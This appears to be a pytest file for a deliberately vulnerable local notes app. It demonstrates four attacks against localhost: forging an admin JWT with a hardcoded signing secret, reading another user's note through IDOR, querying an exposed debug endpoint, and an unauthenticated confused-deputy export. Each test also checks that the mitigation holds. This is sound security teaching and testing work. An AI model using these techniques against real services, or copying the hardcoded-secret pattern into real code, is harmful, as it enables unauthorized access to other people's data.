import pytest
import requests
import jwt
import time

APP_API_URL = "http://127.0.0.1:8000"
RESOURCE_URL = "http://127.0.0.1:8001"
PROCESSING_URL = "http://127.0.0.1:8002"

def get_service_mode():
    try:
        resp = requests.get(f"{APP_API_URL}/health", timeout=3)
        return resp.json().get("vulnerable_mode", False)
    except Exception:
        return False

def test_demonstrate_cwe_798_hardcoded_credentials():
    """
    CWE-798: Use of Hard-coded Credentials.
    Attacker reads source code or decompiled artifact, finds JWT signing secret,
    and forges a token granting administrative privileges without Charlie's password.
    """
    vulnerable = get_service_mode()
    
    # Attacker uses the discovered hardcoded key to sign an Admin token offline
    hardcoded_secret = "insecure-hardcoded-secret-key-cwe-798"
    forged_token = jwt.encode(
        {"sub": "charlie", "role": "admin", "exp": time.time() + 3600},
        hardcoded_secret,
        algorithm="HS256"
    )
    
    headers = {"Authorization": f"Bearer {forged_token}"}
    resp = requests.get(f"{APP_API_URL}/notes", headers=headers)
    
    if vulnerable:
        # EXPLOIT SUCCEEDED: The forged token is accepted! Attacker reads all notes as Admin!
        assert resp.status_code == 200, f"Expected 200 in vulnerable mode, got {resp.status_code}"
        print("\n[+] [EXPLOIT SUCCEEDED] CWE-798: Forged admin JWT accepted by Gateway!")
    else:
        # MITIGATION ACTIVE: Gateway rejects token signed with invalid/hardcoded key
        assert resp.status_code == 401
        print("\n[+] [DEFENSE ACTIVE] CWE-798: Forged JWT rejected (401 Unauthorized)")

def test_demonstrate_cwe_862_idor():
    """
    CWE-862: Missing Authorization / Insecure Direct Object References (IDOR).
    Bob logs in legitimately, but modifies the note_id in the URL to read Alice's private note.
    """
    vulnerable = get_service_mode()
    
    # 1. Bob logs in
    login_resp = requests.post(f"{APP_API_URL}/auth/login", json={"username": "bob", "password": "password123"})
    assert login_resp.status_code == 200
    bob_token = login_resp.json()["access_token"]
    
    # 2. Bob attempts to access Alice's Note #1
    headers = {"Authorization": f"Bearer {bob_token}"}
    resp = requests.get(f"{APP_API_URL}/notes/1", headers=headers)
    
    if vulnerable:
        # EXPLOIT SUCCEEDED: Bob reads Alice's confidential note!
        assert resp.status_code == 200
        assert resp.json()["owner"] == "alice"
        print("\n[+] [EXPLOIT SUCCEEDED] CWE-862: Bob successfully accessed Alice's note via IDOR!")
    else:
        # MITIGATION ACTIVE: Access Control Matrix enforces ownership check (403 Forbidden)
        assert resp.status_code == 403
        print("\n[+] [DEFENSE ACTIVE] CWE-862: IDOR blocked by Resource Service (403 Forbidden)")

def test_demonstrate_cwe_209_sensitive_info_exposure():
    """
    CWE-209: Information Exposure Through Debug / Internal Error Dumps.
    Probing internal endpoints exposes server environment and sensitive notes.
    """
    vulnerable = get_service_mode()
    resp = requests.get(f"{RESOURCE_URL}/debug/environment")
    
    if vulnerable:
        # EXPLOIT SUCCEEDED: Internal memory and environment leaked
        assert resp.status_code == 200
        data = resp.json()
        assert "all_notes" in data
        print("\n[+] [EXPLOIT SUCCEEDED] CWE-209: Debug endpoint leaked server environment and notes database!")
    else:
        # MITIGATION ACTIVE: Debug endpoints disabled
        assert resp.status_code == 403
        print("\n[+] [DEFENSE ACTIVE] CWE-209: Debug endpoint protected (403 Forbidden)")

def test_demonstrate_compositional_vulnerability():
    """
    Compositional Vulnerability: Confused Deputy & Inter-Service Implicit Trust.
    Attacker connects directly to the Processing Service (port 8002) bypassing Gateway auth.
    In vulnerable mode, Processing Service blindly trusts the call and queries Resource Service
    with elevated admin privileges, exporting Alice's note without credentials!
    """
    vulnerable = get_service_mode()
    
    # Attacker triggers export directly on Component 3 without any user token or headers
    resp = requests.post(f"{PROCESSING_URL}/export/1")
    
    if vulnerable:
        # EXPLOIT SUCCEEDED: Processing Service acts as Confused Deputy and exfiltrates Alice's note
        assert resp.status_code == 200
        assert "Alice" in resp.text
        print("\n[+] [EXPLOIT SUCCEEDED] Compositional Flaw: Unauthenticated caller forced export via Confused Deputy!")
    else:
        # MITIGATION ACTIVE: Processing Service rejects unauthenticated trigger (401 Unauthorized)
        assert resp.status_code == 401
        print("\n[+] [DEFENSE ACTIVE] Compositional Flaw: Processing Service rejected unauthenticated request (401)")
